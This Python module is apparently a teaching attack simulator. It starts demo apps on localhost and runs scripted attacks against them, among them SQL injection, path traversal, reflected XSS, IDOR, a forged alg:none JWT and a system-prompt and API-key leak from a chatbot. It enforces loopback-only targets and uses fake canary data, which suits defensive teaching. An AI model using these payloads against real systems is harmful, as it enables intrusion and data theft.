"""Attack simulator: launch a bundled demo app on 127.0.0.1 and run scripted attacks.

SAFETY GUARDRAILS (enforced here):
  * Attacks only ever target the bundled demo apps on 127.0.0.1 on an ephemeral port.
  * Any non-loopback host is hard-refused.
  * Only fake canary secrets/data are used; no real exploit tooling or scanning.
  * Each demo app subprocess is time-limited and killed on exit.

Each attack yields step events: what the attacker tried, the exact request, the response,
and a verdict (COMPROMISED / BLOCKED). Stolen data is shown as obvious fake canary values.
"""

from __future__ import annotations

import contextlib
import socket
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path

import httpx

from ..config import BACKEND_DIR, REPO_DIR

APPS_DIR = REPO_DIR / "demo" / "apps"
_PY = sys.executable  # the venv python running the backend

_LOCAL = {"127.0.0.1", "localhost", "::1"}


def _assert_local(host: str) -> None:
    if host not in _LOCAL:
        raise ValueError(f"Refusing to attack non-local host: {host!r}")


def free_port() -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@dataclass
class DemoApp:
    scenario: str
    variant: str  # "vulnerable" | "patched"
    script: Path
    port: int = 0
    proc: subprocess.Popen | None = None

    @property
    def base(self) -> str:
        return f"http://127.0.0.1:{self.port}"


@contextlib.contextmanager
def launch(scenario: str, variant: str, timeout: float = 15.0):
    """Start a demo app subprocess on 127.0.0.1 and ensure it is reachable; kill on exit."""
    script = APPS_DIR / scenario / f"{variant}.py"
    if not script.exists():
        raise FileNotFoundError(f"No demo script: {script}")
    port = free_port()
    proc = subprocess.Popen(
        [_PY, str(script), str(port)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        cwd=str(script.parent),
    )
    app = DemoApp(scenario=scenario, variant=variant, script=script, port=port, proc=proc)
    deadline = time.time() + timeout
    ready = False
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        try:
            httpx.get(f"{app.base}/", timeout=0.5)
            ready = True
            break
        except Exception:
            time.sleep(0.2)
    try:
        if not ready:
            raise RuntimeError(f"Demo app {scenario}/{variant} did not start")
        yield app
    finally:
        with contextlib.suppress(Exception):
            proc.terminate()
            proc.wait(timeout=5)
        if proc.poll() is None:
            with contextlib.suppress(Exception):
                proc.kill()


def _get(base: str, path: str, **kw) -> httpx.Response:
    url = f"{base}{path}"
    _assert_local(httpx.URL(url).host)
    return httpx.get(url, timeout=5.0, **kw)


@dataclass
class AttackResult:
    name: str
    description: str
    request: str
    response: str
    verdict: str  # COMPROMISED | BLOCKED
    stolen: str = ""


# --- Attack scripts per scenario ----------------------------------------

def attacks_flask_store(app: DemoApp) -> list[AttackResult]:
    results: list[AttackResult] = []
    base = app.base

    # 1. SQL injection login bypass
    payload = "' OR '1'='1"
    r = _get(base, "/login", params={"username": "admin", "password": payload})
    ok = r.status_code == 200 and r.json().get("ok") is True
    results.append(AttackResult(
        "sqli_login_bypass", "Bypass login with a SQL tautology",
        f"GET /login?username=admin&password={payload}", f"{r.status_code} {r.text[:120]}",
        "COMPROMISED" if ok else "BLOCKED",
        stolen=("logged in as admin" if ok else "")))

    # 2. UNION-based data exposure via /admin (unauth) — dump users
    r = _get(base, "/admin")
    exposed = r.status_code == 200 and "users" in r.text
    results.append(AttackResult(
        "admin_unauth_dump", "Read /admin without authentication",
        "GET /admin", f"{r.status_code} {r.text[:120]}",
        "COMPROMISED" if exposed else "BLOCKED",
        stolen=("users + SSNs + api_key (canary)" if exposed else "")))

    # 3. Path traversal to read a canary file OUTSIDE the servable directory
    r = _get(base, "/file", params={"name": "../SECRET_CANARY.txt"})
    got = r.status_code == 200 and "CANARY-FLAG" in r.text
    results.append(AttackResult(
        "path_traversal", "Escape the directory with ../ to read a planted canary file",
        "GET /file?name=../SECRET_CANARY.txt", f"{r.status_code} {r.text[:80]}",
        "COMPROMISED" if got else "BLOCKED",
        stolen=(r.text.strip()[:60] if got else "")))

    # 4. Reflected XSS
    xss = "<script>alert(1)</script>"
    r = _get(base, "/search", params={"q": xss})
    reflected = xss in r.text
    results.append(AttackResult(
        "reflected_xss", "Reflect an unescaped script payload",
        f"GET /search?q={xss}", f"{r.status_code} {r.text[:80]}",
        "COMPROMISED" if reflected else "BLOCKED",
        stolen=("payload reflected unescaped" if reflected else "")))

    # 5. Scrape the exposed fake API key from /admin
    r = _get(base, "/admin")
    key_leaked = r.status_code == 200 and "sk-fake" in r.text
    results.append(AttackResult(
        "api_key_scrape", "Scrape the hard-coded API key from a response",
        "GET /admin", f"{r.status_code} {r.text[:80]}",
        "COMPROMISED" if key_leaked else "BLOCKED",
        stolen=("sk-fake-••••canary" if key_leaked else "")))

    return results


def attacks_notes_api(app: DemoApp) -> list[AttackResult]:
    results: list[AttackResult] = []
    base = app.base
    import base64 as _b64
    import json as _json

    # Get a normal token for alice
    tok = _get(base, "/token", params={"user": "alice"}).json().get("token", "")

    # 1. IDOR: alice reads bob's note (id=2)
    r = _get(base, "/notes/2", headers={"Authorization": f"Bearer {tok}"})
    idor = r.status_code == 200 and "bob" in r.text
    results.append(AttackResult(
        "idor", "Read another user's note by changing the id",
        "GET /notes/2 (as alice)", f"{r.status_code} {r.text[:100]}",
        "COMPROMISED" if idor else "BLOCKED",
        stolen=("bob's note + PII (canary)" if idor else "")))

    # 2. PII exposure in response
    pii = "ssn" in r.text.lower()
    results.append(AttackResult(
        "pii_exposure", "Extract PII returned by the API",
        "GET /notes/2", f"{r.status_code} {r.text[:100]}",
        "COMPROMISED" if pii else "BLOCKED",
        stolen=("SSN •••-••-6666 (canary)" if pii else "")))

    # 3. Forge an admin JWT with alg:none
    header = _b64.urlsafe_b64encode(_json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = _b64.urlsafe_b64encode(_json.dumps({"user": "admin", "is_admin": True}).encode()).rstrip(b"=").decode()
    forged = f"{header}.{payload}."
    r = _get(base, "/me", headers={"Authorization": f"Bearer {forged}"})
    accepted = r.status_code == 200
    results.append(AttackResult(
        "jwt_alg_none", "Forge an admin token using alg:none",
        "GET /me with a forged alg:none token", f"{r.status_code} {r.text[:100]}",
        "COMPROMISED" if accepted else "BLOCKED",
        stolen=("accepted forged admin token" if accepted else "")))

    # 4. CORS wildcard
    r = _get(base, "/token", params={"user": "alice"})
    cors = r.headers.get("Access-Control-Allow-Origin") == "*"
    results.append(AttackResult(
        "cors_wildcard", "Confirm wildcard CORS exposes data to any site",
        "GET /token (inspect CORS headers)",
        f"Access-Control-Allow-Origin: {r.headers.get('Access-Control-Allow-Origin')}",
        "COMPROMISED" if cors else "BLOCKED",
        stolen=("any origin can read responses" if cors else "")))

    return results


def attacks_ai_chatbot(app: DemoApp) -> list[AttackResult]:
    results: list[AttackResult] = []
    base = app.base

    # 1. Trigger the error handler to leak the API key
    r = _get(base, "/chat", params={"message": ""})
    key_leak = "sk-fake" in r.text
    results.append(AttackResult(
        "error_key_leak", "Trigger an error to leak the API key",
        "GET /chat?message= (empty)", f"{r.status_code} {r.text[:100]}",
        "COMPROMISED" if key_leak else "BLOCKED",
        stolen=("sk-fake-••••canary" if key_leak else "")))

    # 2. Leak the system prompt via the same error
    prompt_leak = "system_prompt" in r.text or "CANARY-OVERRIDE" in r.text
    results.append(AttackResult(
        "system_prompt_leak", "Extract the hidden system prompt",
        "GET /chat?message= (empty)", f"{r.status_code} {r.text[:100]}",
        "COMPROMISED" if prompt_leak else "BLOCKED",
        stolen=("system prompt + override code (canary)" if prompt_leak else "")))

    # 3. PII echoed into logs, then read back via a left-in debug endpoint.
    _get(base, "/chat", params={"message": "hi", "email": "victim@example.com"})
    r2 = _get(base, "/debug/logs")
    logs_pii = r2.status_code == 200 and "victim@example.com" in r2.text
    results.append(AttackResult(
        "pii_in_logs", "Read PII from logs via a left-in debug endpoint",
        "GET /chat?...&email=victim@example.com then GET /debug/logs",
        f"{r2.status_code} {r2.text[:100]}",
        "COMPROMISED" if logs_pii else "BLOCKED",
        stolen=("victim email read from logs (canary)" if logs_pii else "")))

    return results


ATTACKS = {
    "flask_store": attacks_flask_store,
    "notes_api": attacks_notes_api,
    "ai_chatbot": attacks_ai_chatbot,
}


def run_attacks(scenario: str, variant: str) -> list[AttackResult]:
    fn = ATTACKS.get(scenario)
    if fn is None:
        raise ValueError(f"Unknown scenario: {scenario}")
    with launch(scenario, variant) as app:
        return fn(app)
